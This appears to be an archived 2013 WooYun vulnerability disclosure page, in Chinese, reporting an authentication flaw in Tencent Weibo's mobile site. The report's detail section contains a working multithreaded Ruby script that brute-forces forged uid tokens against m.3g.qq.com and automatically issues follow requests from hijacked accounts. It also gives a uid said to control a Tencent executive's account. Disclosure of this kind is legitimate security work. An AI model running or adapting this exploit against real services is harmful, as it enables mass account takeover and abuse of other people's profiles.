@@ -1,0 +1,249 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		腾讯微博-移动端认证机制缺陷导致可批量控制微博-开荒篇  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		腾讯微博-移动端认证机制缺陷导致可批量控制微博-开荒篇  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/╰╃清風">╰╃清風</a> 
+</li><li>提交时间：		2013-06-21 15:50</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-06-21：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-06-21：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-07-01：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-07-11：	细节向普通白帽子公开<br/>
+									2013-07-21：	细节向实习白帽子公开<br/>
+									2013-08-05：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail"> 3g版腾讯微博服务端某接口控制不严导致可批量控制微博，通过对接口截包分析最后写了本次的批量利用脚本。<br />
+令附：控制腾讯某高管收听任何人</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"> 首先在讲之前先来看看 <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2013-023152">WooYun: 微信-腾讯微博认证机制存在严重缺陷 可直接控制他人微博</a> <br />
+<br />
+黑哥提供的方法，uid在goole和百度搜索到的结果很少，达不到我想要的批量的效果，那么我就只能自己开荒了，uid是否可以通过伪造或破解得到呢？<br />
+<br />
+<br />
+<br />
+经过多次的参数加密组合发现破解这条路走不通，就只能伪造了-----花了不少时间<br />
+<br />
+<br />
+<br />
+先来看下url：http://m.3g.qq.com/account.html?uid=xxx1&amp;fr=2&amp;aid=xx<br />
+<br />
+uid为32位不知道什么方式的加密，查看规律得到均由字母a-z+0-9组成，aid为自己微博名称（刷自己听众，留自己昵称），fr为随机操作标示一般为4位随机数字。知道规律后就可以用ruby写下我们的程序了。<br />
+<br />
+当ruby批量构造uid请求时，需要对服务端返回的信息进行筛选，获取对我们有用的正确的uid并用log保存在本地，过滤出200ok的返回结果并且抓取页面有“收听”2字的url保存到log中<br />
+<br />
+再访问得到url可以看到又上角收听功能  ok，现在点下看看，发现自己听众+1了<br />
+<br />
+</p><p class="detail"><a href="../images/2115482379cd7570380884ad0ec06ab0c8d3a799.jpg" target="_blank"><img src="../images/2115482379cd7570380884ad0ec06ab0c8d3a799.jpg" alt="7.jpg" width="600"/></a></p><p class="detail"> <br />
+<br />
+接着就是利用GET请求自动操作来达到自动收听的效果，现在来看看收听的get请求URL：http://m.3g.qq.com/cgi-bin/general.cgi?uid=#{uid}&amp;sid=&amp;fr=2&amp;ft=0&amp;aid=#{aid}&amp;cgi=follow&amp;stid=#{stid}  ft=0则为收听，ft=1则为取消收听，下面就可以完成我们的代码了：<br />
+<br />
+</p><pre><code># encoding: utf-8<br />
+require &quot;rubygems&quot;<br />
+require &#039;net/http&#039;<br />
+require &#039;open-uri&#039;<br />
+<br />
+def makefile(file,string)<br />
+  directory = &quot;#{Dir.pwd}&quot;<br />
+  FileUtils.mkdir(directory)  unless File.directory?(directory)<br />
+  f = File.open(&quot;#{directory}/#{file}&quot;,&quot;a&quot;)<br />
+  f.puts string<br />
+  f.close<br />
+end  <br />
+<br />
+def get_url(url)<br />
+	url = URI.parse(url)<br />
+	http      = Net::HTTP.new(url.host, url.port)<br />
+	resp      = http.get(url)	<br />
+end<br />
+<br />
+<br />
+threads=[]<br />
+    12.times {<br />
+    threads &lt;&lt; Thread.new{<br />
+	10000000.times { |x|<br />
+		#puts x<br />
+		aid  = &#039;i0_0i-hu&#039; <br />
+		arr  = (0..9).to_a+(&#039;a&#039;..&#039;z&#039;).to_a<br />
+		uid  = arr.sample(32).join(&quot;&quot;)<br />
+		stid = arr.sample(3).join(&quot;&quot;)<br />
+<br />
+		url = &quot;http://m.3g.qq.com/account.html?uid=#{uid}&amp;fr=2&amp;aid=#{aid}&quot;<br />
+		resp = get_url(url)<br />
+		#puts resp.code<br />
+		response = resp.body.force_encoding(&#039;UTF-8&#039;)<br />
+<br />
+		if response =~ /&gt;收听&lt;\/a&gt;/<br />
+		  puts url<br />
+		  makefile(&quot;log.txt&quot;,url)<br />
+		  send_url=&quot;http://m.3g.qq.com/cgi-bin/general.cgi?uid=#{uid}&amp;sid=&amp;fr=2&amp;ft=0&amp;aid=#{aid}&amp;cgi=follow&amp;stid=#{stid}&quot;<br />
+		  get_url(send_url)<br />
+		end <br />
+		}<br />
+		}<br />
+}<br />
+  threads.each{|t| t.join}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+至此，批量刷收听程序就完成了。<br />
+<br />
+ps：腾讯某高管的uid 可控制其收听任何人<br />
+<br />
+</p><p class="detail"><a href="../images/21144823b1275e4fa9b15f374f505d87ab66e83f.jpg" target="_blank"><img src="../images/21144823b1275e4fa9b15f374f505d87ab66e83f.jpg" alt="9.jpg" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+例如：<br />
+<br />
+http://m.3g.qq.com/account.html?uid=57a27298fc466eacdd2524e8b59a3b11&amp;fr=2&amp;aid=被收听人<br />
+<br />
+<br />
+<br />
+这个可不仅仅能刷粉哦！ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"></p><p class="detail"><a href="../images/21154923fcb1e7b061d5a95987fc70a0cf612448.jpg" target="_blank"><img src="../images/21154923fcb1e7b061d5a95987fc70a0cf612448.jpg" alt="211446058dba9c27ab469be6d5609c32094c505a.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/21155433affdafe6ff996e50d5d7bdb0e5a145f7.jpg" target="_blank"><img src="../images/21155433affdafe6ff996e50d5d7bdb0e5a145f7.jpg" alt="21144957308fbd90dec858ab6d30120e91667a96.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/2115482379cd7570380884ad0ec06ab0c8d3a799.jpg" target="_blank"><img src="../images/2115482379cd7570380884ad0ec06ab0c8d3a799.jpg" alt="7.jpg" width="600"/></a></p><p class="detail"></p><p class="detail"><a href="../images/21154704b7fd60c23cd0af83d21fc3cae5ba8b86.jpg" target="_blank"><img src="../images/21154704b7fd60c23cd0af83d21fc3cae5ba8b86.jpg" alt="2.jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">null </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/╰╃清風" title="╰╃清風">╰╃清風</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-026488" title="腾讯微博-移动端认证机制缺陷导致可批量控制微博-开荒篇">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-06-21 17:51</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢您的报告。这个问题我们已经确认，正在与业务部门进行沟通制定解决方案，如有任何新的进展我们将会及时同步。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="26488";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
